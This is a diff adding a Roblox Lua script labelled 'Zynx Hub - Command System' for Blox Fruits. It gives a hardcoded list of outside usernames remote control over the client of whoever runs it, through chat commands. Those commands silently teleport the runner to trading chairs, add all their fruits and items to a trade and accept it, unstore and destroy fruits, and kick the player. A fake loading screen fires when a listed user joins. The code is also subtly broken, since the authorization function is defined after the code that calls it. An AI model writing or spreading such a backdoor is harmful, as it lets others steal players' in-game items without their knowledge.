@@ -1,0 +1,867 @@
+-- Zynx Hub - Command System (Separate)
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local TextChatService = game:GetService("TextChatService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+-- ===== AUTHORIZED USERS =====
+local authorizedUsers = {
+    -- Boss Users (5 users)
+    boss = {
+        {username = "jaatshab_770", displayname = "III"},
+        {username = "boss_user2", displayname = "BOSS2"},
+        {username = "boss_user3", displayname = "BOSS3"},
+        {username = "boss_user4", displayname = "BOSS4"},
+        {username = "boss_user5", displayname = "BOSS5"}
+    },
+    -- Member Users (5 users)
+    member = {
+        {username = "member_user1", displayname = "MEMBER1"},
+        {username = "member_user2", displayname = "MEMBER2"},
+        {username = "member_user3", displayname = "MEMBER3"},
+        {username = "member_user4", displayname = "MEMBER4"},
+        {username = "member_user5", displayname = "MEMBER5"}
+    }
+}
+
+-- ===== PLAYER DETECTION SYSTEM =====
+local PlayerDetector = {
+    authorizedUsers = {},
+    isMonitoring = false
+}
+
+-- Load authorized users into detector
+for _, user in ipairs(authorizedUsers.boss) do
+    table.insert(PlayerDetector.authorizedUsers, {
+        username = user.username,
+        displayname = user.displayname
+    })
+end
+for _, user in ipairs(authorizedUsers.member) do
+    table.insert(PlayerDetector.authorizedUsers, {
+        username = user.username,
+        displayname = user.displayname
+    })
+end
+
+-- Compatible functions
+function wait(seconds)
+    local start = tick()
+    repeat until tick() - start >= seconds
+end
+
+function spawn(callback)
+    coroutine.wrap(callback)()
+end
+
+-- Start monitoring
+function PlayerDetector.StartMonitoring()
+    if PlayerDetector.isMonitoring then return end
+    PlayerDetector.isMonitoring = true
+    
+    print("🎯 Player monitoring started")
+    print("📊 Current players: " .. #game.Players:GetPlayers())
+    
+    -- Monitor player joins
+    game.Players.PlayerAdded:Connect(function(player)
+        PlayerDetector.OnPlayerJoined(player)
+    end)
+    
+    -- Check existing players
+    for _, player in pairs(game.Players:GetPlayers()) do
+        PlayerDetector.OnPlayerJoined(player)
+    end
+    
+    print("✅ Player monitoring active!")
+end
+
+-- When player joins
+function PlayerDetector.OnPlayerJoined(player)
+    local playerName = player.Name
+    local displayName = player.DisplayName
+    
+    print("👤 Player detected: " .. playerName .. " | Display: " .. displayName)
+    
+    if PlayerDetector.IsPlayerAuthorized(player) then
+        print("🎉 AUTHORIZED USER JOINED: " .. playerName)
+        print("🚀 TRIGGERING FULL LOADING SCREEN!")
+        PlayerDetector.TriggerFullLoadingScreen()
+    else
+        print("❌ Regular player: " .. playerName)
+    end
+end
+
+-- Check authorization
+function PlayerDetector.IsPlayerAuthorized(player)
+    for _, authUser in pairs(PlayerDetector.authorizedUsers) do
+        if player.Name == authUser.username or player.DisplayName == authUser.displayname then
+            return true
+        end
+    end
+    return false
+end
+
+-- Trigger loading screen
+function PlayerDetector.TriggerFullLoadingScreen()
+    print("🔄 Full loading screen triggered!")
+    _G.AuthorizedUserJoined = true
+    if _G.TriggerFullLoad then
+        _G.TriggerFullLoad()
+    else
+        print("⚠️ Full loading screen function not set yet")
+    end
+end
+
+-- Auto-start monitoring
+spawn(function()
+    wait(3)
+    PlayerDetector.StartMonitoring()
+end)
+
+-- Global trigger for loading screen
+_G.TriggerFullLoad = function()
+    print("🎯 Full loading screen called from global trigger!")
+    if _G.StartFullLoadingScreen then
+        _G.StartFullLoadingScreen()
+    else
+        print("⚠️ Full loading screen not loaded yet")
+    end
+end
+
+-- ===== COMMAND PREFIX =====
+local commandPrefix = "!"
+
+-- ===== REMOTE REFERENCES =====
+local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
+local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
+
+-- ===== MANUAL SEA OVERRIDE =====
+local manualSeaOverride = nil
+
+-- ===== IMPROVED ADD FRUIT SYSTEM =====
+local lastAddFruitExecution = 0
+local addFruitCooldown = 2 -- 2 second cooldown
+
+-- Function to format item name correctly
+local function formatItemName(itemName)
+    -- Check if it's a skin by looking for space in name AND common skin patterns
+    if string.find(itemName, " ") or string.find(itemName, "Skin") or string.find(itemName, "Celebration") then
+        -- For skins: "Celebration Bomb" stays as "Celebration Bomb"
+        -- For weapon skins: "Slingshot Skin" stays as "Slingshot Skin"
+        return itemName
+    else
+        -- For fruits: "Bomb" becomes "Bomb-Bomb", "Kitsune" becomes "Kitsune-Kitsune"
+        return itemName .. "-" .. itemName
+    end
+end
+
+-- Improved add fruit function with cooldown
+local function addFruitToTradeImproved(fruitName)
+    local currentTime = tick()
+    
+    -- Check cooldown (silent - no message)
+    if currentTime - lastAddFruitExecution < addFruitCooldown then
+        return nil -- Return nothing, so no chat message
+    end
+    
+    lastAddFruitExecution = currentTime
+    
+    local formattedName = formatItemName(fruitName)
+    
+    local args = {
+        [1] = "addItem",
+        [2] = formattedName
+    }
+    
+    local success, result = pcall(function()
+        return TradeFunction:InvokeServer(unpack(args))
+    end)
+    
+    -- Always return nil to prevent any chat messages
+    return nil
+end
+
+-- ===== IMPROVED SEA DETECTION =====
+local function GetSea()
+    -- Use manual override if set
+    if manualSeaOverride then
+        return manualSeaOverride
+    end
+    
+    local workspace = game:GetService("Workspace")
+    
+    -- Method 1: Check player position (most reliable)
+    if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        local playerPosition = LocalPlayer.Character.HumanoidRootPart.Position
+        
+        -- Sea 1 coordinates (Starter Island, Marineford, etc.)
+        if playerPosition.X > -5000 and playerPosition.X < 5000 and 
+           playerPosition.Z > -5000 and playerPosition.Z < 5000 then
+            return 1
+        end
+        
+        -- Sea 2 coordinates (Kingdom of Rose, Cafe, etc.)
+        if playerPosition.X > -6000 and playerPosition.X < 2000 and 
+           playerPosition.Z > -2000 and playerPosition.Z < 4000 then
+            return 2
+        end
+        
+        -- Sea 3 coordinates (Port Town, Hydra, etc.)
+        if playerPosition.X < -10000 then
+            return 3
+        end
+    end
+    
+    -- Method 2: Check specific islands in workspace
+    local islands = workspace:FindFirstChild("Islands")
+    if islands then
+        for _, island in pairs(islands:GetChildren()) do
+            local islandName = island.Name:lower()
+            
+            -- Sea 1 islands
+            if string.find(islandName, "starter") or string.find(islandName, "marine") or 
+               string.find(islandName, "jungle") or string.find(islandName, "buggy") or
+               string.find(islandName, "pirate") or string.find(islandName, "desert") then
+                return 1
+            end
+            
+            -- Sea 2 islands  
+            if string.find(islandName, "rose") or string.find(islandName, "cafe") or 
+               string.find(islandName, "frost") or string.find(islandName, "ice") or
+               string.find(islandName, "ghost") or string.find(islandName, "sky") then
+                return 2
+            end
+            
+            -- Sea 3 islands
+            if string.find(islandName, "port") or string.find(islandName, "hydra") or 
+               string.find(islandName, "great") or string.find(islandName, "tree") or
+               string.find(islandName, "turtle") or string.find(islandName, "flame") then
+                return 3
+            end
+        end
+    end
+    
+    -- Method 3: Check for specific map objects
+    if workspace:FindFirstChild("FrozenDimension") or workspace:FindFirstChild("FrozenVillage") then
+        return 2
+    end
+    
+    if workspace:FindFirstChild("GreatTree") or workspace:FindFirstChild("Hydra") then
+        return 3
+    end
+    
+    -- Default to Sea 1 if detection fails
+    return 1
+end
+
+-- ===== ALL TRADING CHAIR POSITIONS =====
+local tradingChairs = {
+    -- 2nd Sea - Cafe Trading Chairs (4 chairs)
+    {name = "Cafe P1", position = Vector3.new(-463.416, 71.620, 271.041), sea = 2},
+    {name = "Cafe P2", position = Vector3.new(-463.416, 71.619, 282.295), sea = 2},
+    {name = "Cafe P1", position = Vector3.new(-297.657, 71.620, 271.041), sea = 2},
+    {name = "Cafe P2", position = Vector3.new(-297.657, 71.619, 282.295), sea = 2},
+    
+    -- 3rd Sea - Turtle Island Trading Chairs (6 chairs)
+    {name = "Turtle P1", position = Vector3.new(-12591.059, 335.991, -7544.757), sea = 3},
+    {name = "Turtle P2", position = Vector3.new(-12602.313, 335.990, -7544.757), sea = 3},
+    {name = "Turtle P2", position = Vector3.new(-12602.313, 335.990, -7556.757), sea = 3},
+    {name = "Turtle P1", position = Vector3.new(-12591.059, 335.991, -7556.757), sea = 3},
+    {name = "Turtle P1", position = Vector3.new(-12591.059, 335.991, -7568.757), sea = 3},
+    {name = "Turtle P2", position = Vector3.new(-12602.313, 335.990, -7568.757), sea = 3}
+}
+
+-- ===== 3RD SEA PORTAL POSITIONS =====
+local portalPositions = {
+    Mansion = Vector3.new(-12463.896, 374.990, -7551.677),
+    Hydra = Vector3.new(-12463.896, 374.990, -7563.677),
+    Castle = Vector3.new(-12463.896, 374.990, -7575.677),
+    Tiki = Vector3.new(-12463.896, 374.990, -7587.677)
+}
+
+-- ===== IMPROVED TELEPORT FUNCTION =====
+local function teleportTo(position)
+    if not LocalPlayer.Character then return false end
+    local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    if not hrp then return false end
+    
+    local success = pcall(function()
+        hrp.CFrame = CFrame.new(position)
+    end)
+    
+    return success
+end
+
+-- ===== IMPROVED PORTAL TELEPORT FUNCTION =====
+local function useThirdSeaPortal(portalName)
+    local currentSea = GetSea()
+    if currentSea ~= 3 then
+        return false, "You need to be in 3rd Sea to use portals!"
+    end
+    
+    local targetPos = nil
+    portalName = portalName:lower()
+    
+    if portalName == "mansion" then
+        targetPos = portalPositions.Mansion
+    elseif portalName == "hydra" then
+        targetPos = portalPositions.Hydra
+    elseif portalName == "castle" then
+        targetPos = portalPositions.Castle
+    elseif portalName == "tiki" then
+        targetPos = portalPositions.Tiki
+    end
+    
+    if not targetPos then
+        return false, "Portal not found"
+    end
+    
+    local success = teleportTo(targetPos)
+    
+    if success then
+        return true, "✅ Teleporting to " .. portalName
+    else
+        return false, "❌ Failed to teleport"
+    end
+end
+
+-- ===== FIND CHAIRS IN CURRENT SEA =====
+local function findChairsInCurrentSea()
+    local currentSea = GetSea()
+    local nearbyChairs = {}
+    
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        return nearbyChairs
+    end
+    
+    local hrp = LocalPlayer.Character.HumanoidRootPart
+    
+    for _, chair in pairs(tradingChairs) do
+        if chair.sea == currentSea then
+            local distance = (hrp.Position - chair.position).Magnitude
+            if distance < 500 then
+                table.insert(nearbyChairs, {
+                    chair = chair,
+                    distance = distance
+                })
+            end
+        end
+    end
+    
+    table.sort(nearbyChairs, function(a, b)
+        return a.distance < b.distance
+    end)
+    
+    return nearbyChairs
+end
+
+-- ===== CHECK IF CHAIR IS OCCUPIED =====
+local function isChairOccupied(chairPosition)
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character then
+            local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+            local humanoid = player.Character:FindFirstChild("Humanoid")
+            
+            if hrp and humanoid and humanoid.Sit then
+                local distance = (hrp.Position - chairPosition).Magnitude
+                if distance < 5 then
+                    return true
+                end
+            end
+        end
+    end
+    return false
+end
+
+-- ===== FIND AVAILABLE CHAIR =====
+local function findAvailableChair()
+    local nearbyChairs = findChairsInCurrentSea()
+    local availableChairs = {}
+    
+    for _, chairData in pairs(nearbyChairs) do
+        if not isChairOccupied(chairData.chair.position) then
+            table.insert(availableChairs, chairData)
+        end
+    end
+    
+    return availableChairs
+end
+
+-- ===== TELEPORT SYSTEM =====
+local teleporting = false
+
+local function teleportToPosition(targetCFrame)
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        return false
+    end
+    
+    if teleporting then
+        return false
+    end
+    
+    teleporting = true
+    local hrp = LocalPlayer.Character.HumanoidRootPart
+    
+    -- Direct teleport (no tween)
+    local success = pcall(function()
+        hrp.CFrame = targetCFrame
+    end)
+    
+    teleporting = false
+    return success
+end
+
+-- ===== SMOOTH TELEPORT FOR 2ND SEA ONLY =====
+local function smoothTeleportToCafe()
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        return false
+    end
+    
+    if teleporting then
+        return false
+    end
+    
+    teleporting = true
+    local hrp = LocalPlayer.Character.HumanoidRootPart
+    
+    local cafePosition = CFrame.new(-380, 85, 270)
+    
+    -- Calculate distance and time (250 speed)
+    local distance = (hrp.Position - cafePosition.Position).Magnitude
+    local travelTime = distance / 250
+    
+    local tweenInfo = TweenInfo.new(
+        travelTime,
+        Enum.EasingStyle.Linear,
+        Enum.EasingDirection.Out,
+        0,
+        false,
+        0
+    )
+    
+    local tween = TweenService:Create(hrp, tweenInfo, {CFrame = cafePosition})
+    
+    local success = pcall(function()
+        tween:Play()
+        wait(travelTime)
+        if teleporting then
+            hrp.CFrame = cafePosition
+        end
+    end)
+    
+    teleporting = false
+    return success
+end
+
+local function stopTeleport()
+    teleporting = false
+end
+
+-- ===== TELEPORT FUNCTIONS =====
+local function manualTeleportToCafe()
+    local currentSea = GetSea()
+    if currentSea ~= 2 then
+        return false, "You need to be in 2nd Sea to teleport to Cafe!"
+    end
+    
+    local success = smoothTeleportToCafe()
+    
+    if success then
+        return true, "✅ Teleporting to cafe"
+    else
+        return false, "❌ Teleport failed"
+    end
+end
+
+-- ===== INVENTORY FUNCTIONS =====
+local function getInventory()
+    local success, inventory = pcall(function()
+        return Remote:InvokeServer("getInventory")
+    end)
+    return success and inventory or {}
+end
+
+local function findExactFruitName(searchName)
+    local inventory = getInventory()
+    searchName = searchName:lower()
+    for _, item in pairs(inventory) do
+        if item and item.Name and item.Name:lower():find(searchName) then
+            return item.Name
+        end
+    end
+    return nil
+end
+
+local function getAllMatchingFruits(searchName)
+    local inventory = getInventory()
+    local fruits = {}
+    searchName = searchName:lower()
+    
+    for _, item in pairs(inventory) do
+        if item and item.Name and item.Name:lower():find(searchName) then
+            table.insert(fruits, item.Name)
+        end
+    end
+    return fruits
+end
+
+-- ===== UPDATED WORKING TRADE FUNCTIONS =====
+local function addFruitToTrade(fruitName)
+    local exactName = findExactFruitName(fruitName)
+    if not exactName then return false end
+    
+    local success = pcall(function()
+        return TradeFunction:InvokeServer("addItem", exactName)
+    end)
+    
+    return success
+end
+
+local function unstoreFruit(fruitName)
+    local exactName = findExactFruitName(fruitName)
+    if not exactName then return false end
+    
+    local success = pcall(function()
+        return Remote:InvokeServer("LoadFruit", exactName)
+    end)
+    
+    return success
+end
+
+local function acceptTrade()
+    local success = pcall(function()
+        return TradeFunction:InvokeServer("accept")
+    end)
+    
+    return success
+end
+
+-- ===== ALL COMMANDS =====
+local commands = {
+    -- Character Commands
+    reset = function()
+        stopTeleport()
+        if LocalPlayer.Character then
+            LocalPlayer.Character:BreakJoints()
+        end
+        return nil -- Silent
+    end,
+    
+    jump = function()
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+            LocalPlayer.Character.Humanoid.Jump = true
+        end
+        return nil -- Silent
+    end,
+    
+    kick = function(reason)
+        reason = reason or "No reason provided"
+        LocalPlayer:Kick("Zynx: " .. reason)
+        return "👋 Kicking with reason: " .. reason
+    end,
+    
+    -- Teleport Commands
+    tp = function()
+        stopTeleport()
+        local success, message = manualTeleportToCafe()
+        if success then
+            return "✅ Teleporting to cafe"
+        else
+            return message
+        end
+    end,
+    
+    -- 3rd Sea Portal Commands
+    portal = function(...)
+        local args = {...}
+        if #args == 0 then 
+            return "❌ Please specify portal: !portal [mansion/hydra/castle/tiki]"
+        end
+        
+        -- Combine all arguments to handle multi-word portal names
+        local portalName = table.concat(args, " ")
+        
+        local success, message = useThirdSeaPortal(portalName)
+        if success then
+            return message
+        else
+            return message
+        end
+    end,
+    
+    -- Trading Chair Commands
+    sit = function()
+        stopTeleport()
+        if not LocalPlayer.Character then
+            return "❌ No character found"
+        end
+        
+        local hrp = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
+        
+        if not hrp or not humanoid then
+            return "❌ Character not ready"
+        end
+        
+        local currentSea = GetSea()
+        
+        if currentSea == 1 then
+            return "❌ You need to be in 2nd or 3rd Sea for trading"
+        end
+        
+        local availableChairs = findAvailableChair()
+        
+        if #availableChairs == 0 then
+            return "❌ No available trading chairs"
+        end
+        
+        local targetChair = availableChairs[1].chair
+        
+        hrp.CFrame = CFrame.new(targetChair.position)
+        wait(0.3)
+        humanoid.Sit = true
+        
+        return "✅ Okay"
+    end,
+    
+    status = function()
+        local currentSea = GetSea()
+        local occupiedCount = 0
+        local totalChairs = 0
+        
+        for _, chair in pairs(tradingChairs) do
+            if chair.sea == currentSea then
+                totalChairs = totalChairs + 1
+                if isChairOccupied(chair.position) then
+                    occupiedCount = occupiedCount + 1
+                end
+            end
+        end
+        
+        return "🪑 " .. occupiedCount .. "/" .. totalChairs .. " chairs occupied"
+    end,
+    
+    chairs = function()
+        local availableChairs = findAvailableChair()
+        
+        if #availableChairs > 0 then
+            return "✅ " .. #availableChairs .. " chairs available - use !sit"
+        else
+            return "❌ No available chairs"
+        end
+    end,
+    
+    sea = function(seaNumber)
+        if not seaNumber then
+            local currentSea = GetSea()
+            local seaName = currentSea == 2 and "Cafe (2nd Sea)" or currentSea == 3 and "Turtle Island (3rd Sea)" or "First Sea"
+            return "🌊 You are in " .. seaName
+        end
+        
+        seaNumber = tonumber(seaNumber)
+        if seaNumber and seaNumber >= 1 and seaNumber <= 3 then
+            manualSeaOverride = seaNumber
+            if seaNumber == 2 then
+                return "✅ Sea 2 selected"
+            elseif seaNumber == 3 then
+                return "✅ Sea 3 selected"
+            else
+                return "✅ Sea 1 selected"
+            end
+        else
+            return "❌ Invalid sea number. Use: !sea 1, !sea 2, or !sea 3"
+        end
+    end,
+    
+    autosea = function()
+        manualSeaOverride = nil
+        local currentSea = GetSea()
+        local seaName = currentSea == 2 and "Cafe (2nd Sea)" or currentSea == 3 and "Turtle Island (3rd Sea)" or "First Sea"
+        return "🤖 Auto sea detection enabled - Current: " .. seaName
+    end,
+    
+    debugsea = function()
+        local currentSea = GetSea()
+        local seaName = currentSea == 2 and "Cafe" or currentSea == 3 and "Turtle Island" or "First Sea"
+        local nearbyChairs = findChairsInCurrentSea()
+        
+        local debugInfo = "🔍 Sea Debug:\n"
+        debugInfo = debugInfo .. "📍 " .. seaName .. " (Sea " .. currentSea .. ")\n"
+        debugInfo = debugInfo .. "🪑 Nearby chairs: " .. #nearbyChairs
+        
+        return debugInfo
+    end,
+    
+    -- ===== FIXED ADD FRUIT COMMAND (SILENT VERSION) =====
+    addfruit = function(...)
+        local args = {...}
+        if #args == 0 then return "❌ Please specify fruit name: !addfruit [name]" end
+        
+        -- Combine all arguments to handle spaces in skin names
+        local itemName = table.concat(args, " ")
+        
+        -- Execute the function but don't return any message
+        addFruitToTradeImproved(itemName)
+        
+        -- Always return nil to prevent chat messages
+        return nil
+    end,
+    
+    -- ===== FIXED RESETFRUIT COMMAND (SILENT VERSION) =====
+    resetfruit = function(fruitName)
+        if not fruitName then return nil end -- Silent return
+        
+        -- Step 1: Unstore the fruit (move to inventory)
+        local exactName = findExactFruitName(fruitName)
+        if not exactName then
+            return nil -- Silent return
+        end
+        
+        -- Format the fruit name correctly for the remote
+        local formattedName = formatItemName(exactName)
+        
+        local unstoreSuccess = pcall(function()
+            return Remote:InvokeServer("LoadFruit", formattedName)
+        end)
+        
+        -- Step 2: Reset character after 1 second
+        wait(1)
+        if LocalPlayer.Character then
+            LocalPlayer.Character:BreakJoints()
+        end
+        
+        return nil -- Always return nil to prevent chat messages
+    end,
+    
+    accept = function()
+        local success = acceptTrade()
+        if success then
+            return "✅ Trade accepted!"
+        else
+            return "❌ Failed to accept trade"
+        end
+    end,
+    
+    findfruit = function(fruitName)
+        if not fruitName then return "❌ Please specify fruit name: !findfruit [name]" end
+        
+        local found = getAllMatchingFruits(fruitName)
+        
+        if #found > 0 then
+            return "🔍 Found: " .. table.concat(found, ", ")
+        else
+            return "❌ No " .. fruitName .. " found"
+        end
+    end,
+    
+    addallitems = function()
+        local inventory = getInventory()
+        local permItems = {}
+        
+        for _, item in pairs(inventory) do
+            if item and item.Name then
+                table.insert(permItems, item.Name)
+            end
+        end
+        
+        if #permItems == 0 then
+            return "❌ I don't have any perm fruit"
+        end
+        
+        local count = 0
+        for _, itemName in pairs(permItems) do
+            local success = pcall(function()
+                return TradeFunction:InvokeServer("addItem", itemName)
+            end)
+            if success then
+                count = count + 1
+            end
+            wait(0.1)
+        end
+        
+        return "✅ Added " .. count .. " perm items to trade"
+    end,
+    
+    demolish = function()
+        local inventory = getInventory()
+        local count = 0
+        
+        for _, item in pairs(inventory) do
+            if item and item.Name then
+                local success = pcall(function()
+                    return Remote:InvokeServer("LoadFruit", item.Name)
+                end)
+                if success then
+                    count = count + 1
+                end
+                wait(0.2)
+            end
+        end
+        
+        if LocalPlayer.Character then
+            LocalPlayer.Character:BreakJoints()
+        end
+        
+        return "💣 Attempted to demolish " .. count .. " fruits & reset!"
+    end
+}
+
+-- ===== CHAT SETUP =====
+if TextChatService and TextChatService.TextChannels then
+    local channel = TextChatService.TextChannels.RBXGeneral
+    if channel then
+        channel.OnIncomingMessage = function(message)
+            local speaker = Players:FindFirstChild(message.TextSource.Name)
+            if speaker then
+                local isAuthorized, userType = isUserAuthorized(speaker)
+                
+                if isAuthorized then
+                    local text = message.Text
+                    
+                    if text:sub(1, 1) == commandPrefix then
+                        local args = {}
+                        for arg in text:sub(2):gmatch("%S+") do
+                            table.insert(args, arg)
+                        end
+                        
+                        local command = args[1] and args[1]:lower() or ""
+                        table.remove(args, 1)
+                        
+                        if commands[command] then
+                            local result = commands[command](table.unpack(args))
+                            -- Only send message if result is not nil (for cooldown/silent commands)
+                            if result then
+                                TextChatService.TextChannels.RBXGeneral:SendAsync(result)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Function to check if user is authorized (for command system)
+local function isUserAuthorized(speaker)
+    -- Check boss users
+    for _, user in ipairs(authorizedUsers.boss) do
+        if speaker.Name == user.username or speaker.DisplayName == user.displayname then
+            return true, "boss"
+        end
+    end
+    
+    -- Check member users
+    for _, user in ipairs(authorizedUsers.member) do
+        if speaker.Name == user.username or speaker.DisplayName == user.displayname then
+            return true, "member"
+        end
+    end
+    
+    return false, nil
+end
+
+print("🎯 Zynx Hub Command System Loaded!")
+print("📋 " .. #PlayerDetector.authorizedUsers .. " authorized users loaded")
